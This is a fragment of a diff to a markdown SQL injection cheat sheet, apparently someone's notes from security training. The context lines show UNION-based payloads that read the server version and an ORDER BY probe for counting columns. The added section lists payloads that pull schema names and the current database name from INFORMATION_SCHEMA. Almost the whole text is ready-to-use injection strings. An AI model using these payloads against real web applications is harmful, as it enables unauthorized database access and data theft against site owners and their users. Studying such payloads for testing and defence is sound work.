@@ -44,4 +44,8 @@ Reminder: We are adding an extra dash (-) at the end, to show you that there is 
 - `val' UNION select 1,@@version,3,4-- -`
 - `' order by 2-- -`
 
-****
+**SCHEMATA** : 
+- `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
+- `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
+- `cn' UNION select 1,database(),2,3-- -`
+- 
